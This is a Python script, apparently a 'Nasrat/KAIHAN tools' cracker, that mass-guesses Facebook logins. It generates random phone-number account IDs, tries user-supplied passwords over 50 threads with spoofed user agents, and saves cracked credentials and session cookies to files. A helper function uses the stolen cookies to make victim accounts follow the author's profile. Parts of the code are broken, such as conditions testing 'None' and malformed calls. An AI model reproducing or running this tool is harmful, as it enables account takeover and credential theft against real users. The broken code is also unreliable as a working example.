#KAIHANMOHAMMADI TOOLS
#NO PAIN NO GAIN
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://www.facebook.com/profile.php?id=100074863202555')
print('SUPPORT ME FOR MORE')

print('\n\033[1;92m [●] →Installing Nasrat Tools ...')
print('\n\033[1;92m [●] →Please wait  ...')
print('\n\033[1;92m [●] →Checking For Update ...')
print('\n\033[1;92m [●] →Update Done ✓  ...')
print('\n\033[1;92m [●] →Use From Tools  ...')
import uuid
import os,sys,time,json,random,re,string,platform,base64



def ud():
    os.system('clear') 
    print(logo)
    print(' \033[1;97m[1] START RANDOM COLING ')
    print(' \033[1;97m[2] EXIT')
    opt = input('\nChoose option [•] ')
    if opt == '1':
        #os.system('espeak plaese,follow,my,facebook,account')
        #os.system('xdg-open https://www.facebook.com/profile.php?id=100009471344093/')
        o()
        return None
    #None('\n\x1b[1;31mEXIT\x1b[0;97m') 


def o():
    os.system('clear')
    print(logo)
  #  os.system(' K_TECH,TOOLS,MENU')
    print('\x1b[1;32m\x1b[1;97m  [1] RANDOM CRACK ')
    print('\x1b[1;32m\x1b[1;97m  [2] CONTACT ME ON FACEBOOK')
    ##print(' \x1b[1;32m\x1b[1;95m {3} CONTACT ME ON TELEGRAM')
    print(' \x1b[1;32m\x1b[1;31m [0] EXIT') 
    opt = input('\n\x1b[1;97m[?] Choose option [•] ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100074863202555')
        return None
    if None == '3':
     #   os.system('xdg-open https://t.me/Aliaqa146')
        return None
    if None == '0':
        os.system('exit')
        return None
    #None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="GET")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="GET")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100009471344093', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0001)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =("""\033[1;92m
                      \x1b[97m[\033[37;41m  WELCOME TO NASRAT TOOLS   \033[0;m]
\033[1;91m╔═════════════════════════════════════════════════════════════════════╗
║    dMP dMP     .aMMMb     dMP     dMP dMP     .aMMMb     dMMMMb     ║
║   dMP.dMP     dMP"dMP    amr     dMP dMP     dMP"dMP    dMP dMP     ║
║  dMMMMK"     dMMMMMP    dMP     dMMMMMP     dMMMMMP    dMP dMP      ║
║ dMP"AMF     dMP dMP    dMP     dMP dMP     dMP dMP    dMP dMP       ║
║dMP dMP     dMP dMP    dMP     dMP dMP     dMP dMP    dMP dMP        ║
╚═════════════════════════════════════════════════════════════════════╝                                    
                 \033[1;97m╔══════════════╦═══════════════════╗
                 \033[1;97m║\033[1;97m[•] \033[1;97mOWNER     ║\033[1;97m[✓]\033[1;91mNASRAT\033[1;97m          ║
                 \033[1;97m║\033[1;97m[•] \033[1;97mTELEGRAM  ║\033[1;97m[✓]\033[1;91m@Nasratha\033[1;97m      ║
                 \033[1;97m║\033[1;97m[•] \033[1;97mFACEBOOK  ║\033[1;97m[✓]\033[1;91mNasrat hack\033[1;97m ║
                 \033[1;97m║\033[1;97m[•] \033[1;97mTOOLS NAME║\033[1;97m[✓]\033[1;91mRANDOM\033[1;97m          ║
                 \033[1;97m║\033[1;97m[•] \033[1;97mTOOSL TYPE║\033[1;97m[✓]\033[1;91mTRIAL\033[1;97m           ║
                 \033[1;97m║\033[1;97m[•] \033[1;97mVERSION   ║\033[1;97m[✓]\033[1;91m1.5 \033[1;97m            ║
                 \033[1;97m╚══════════════╩═══════════════════╝
""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Mobile; rv:48.0; A405DL'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Gecko/48.0 Firefox/48.0 KAIOS/2.5/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
 #APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    print(f'\033[1;97m SIM CODES : \033[1;92m[9377],[9376],[9378],[9379],[9372]')
  
    code = input(' PUT CODE : ')
    print("")

    os.system(' PUT,CLONING,LIMITED')  
    limit = int(input('\x1b[1;91m EXAMPLE: 2000, 3000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)

    os.system(' Enter,Password,LIMITED,')  
    passx = int(input("\033[1;92m[*] PUTT PASSWORD LIMIT]  : "))
    HamiiID = []
    print("")
    os.system(' Enter,your,country,password,list')
    for bilal in range(passx):
        pww = input("[*] Enter Password : ") 
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;97m TOTAL IDS: '+tl)
        print('\033[1;97m THE PROCESS HAS BEEN STARTED')
        print('\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;91m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;92m============================================')
    print('Crack process has been completed')
    print('Ids saved in\x1b[1;95m/sdcard/K_TECH-OK.txt ')
    print('\033[1;92m============================================')
    os.system('espeak Ids,saved,in,/sdcard KAIHAN-OK,dote,txt')  
 

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r[\033[1;97mKAIHAN\033[1;97m] %s|\33[1;92mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
            "method": 'GET',         
            "scheme": 'https',
            'accept': '*/*',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '3.4000000953674316',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"SH-03K"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'viewport-width': '980',
            'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(48*'═')
                cid = coki[151:166]
                print('\033[1;92m[KAIHANOK] '+uid+' | '+ps+'\n\033[1;93mCOOKIE[🍪]=\033[1;22m'+coki+   '  ''  \033[0;92m');print(50*'\033[1;92m═')
                open('KAIHAN -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            #elif #'checkpoint' in log_cookies:
                #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #cid = coki[141:152]
                #print('\033[1;31m[✗] '+uid+' | '+ps+'\x1b[1;31m\33[1;31m');print(48*'═')
                #open('/sdcard/KAIHAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass

ud()
